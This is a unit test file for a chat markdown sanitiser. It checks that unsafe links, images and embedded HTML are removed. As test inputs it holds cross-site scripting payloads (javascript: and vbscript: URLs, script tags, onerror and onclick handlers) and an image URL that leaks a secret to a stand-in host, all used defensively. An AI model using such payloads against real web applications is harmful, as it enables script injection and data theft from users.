import { markdownToChatHtml, markdownToHtml } from './markdown'

describe('markdownToChatHtml', () => {
  it('renders Markdown', () => {
    const html = markdownToChatHtml('**bold**\n\n- item')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).toContain('<li>item</li>')
  })

  it('opens https links safely in a new tab', () => {
    expect(markdownToChatHtml('[Asset](https://market.example/a)')).toContain(
      '<a href="https://market.example/a" target="_blank" rel="noopener noreferrer">Asset</a>'
    )
  })

  it.each([
    '[x](javascript:alert(1))',
    '[x](JaVaScRiPt:alert(1))',
    '[x](data:text/html;base64,PHNjcmlwdD4=)',
    '[x](vbscript:msgbox(1))',
    '[x](http://market.example/a)',
    '[x](//evil.example/a)',
    '[x](/relative)'
  ])('removes the link but keeps the text of %s', (markdown) => {
    const html = markdownToChatHtml(markdown)
    expect(html).not.toContain('<a')
    expect(html).not.toContain('href')
    expect(html).toContain('x')
  })

  it('removes images, including those inside links', () => {
    expect(
      markdownToChatHtml('![a](https://evil.example/?leak=secret)')
    ).not.toContain('evil.example')
    const linked = markdownToChatHtml(
      '[![a](https://evil.example/i.png)](https://market.example/)'
    )
    expect(linked).not.toContain('<img')
    expect(linked).not.toContain('evil.example')
  })

  it('removes reference-style images', () => {
    const html = markdownToChatHtml(
      '![a][ref]\n\n[ref]: https://evil.example/i.png'
    )
    expect(html).not.toContain('evil.example')
  })

  it.each([
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<iframe src="https://evil.example"></iframe>',
    '<a href="javascript:alert(1)">x</a>',
    '<div onclick="alert(1)">x</div>'
  ])('drops embedded HTML: %s', (markdown) => {
    const html = markdownToChatHtml(markdown)
    expect(html).not.toMatch(/<(script|img|iframe|a|div)\b/)
    expect(html).not.toContain('onerror=')
    expect(html).not.toContain('onclick=')
  })

  it('removes unsafe links nested in other elements', () => {
    const html = markdownToChatHtml('- **[x](javascript:alert(1))**')
    expect(html).not.toContain('javascript:')
    expect(html).toContain('<strong>x</strong>')
  })
})

describe('markdownToHtml', () => {
  it('keeps its behaviour with images', () => {
    expect(markdownToHtml('![a](https://example.com/i.png)')).toContain('<img')
  })
})
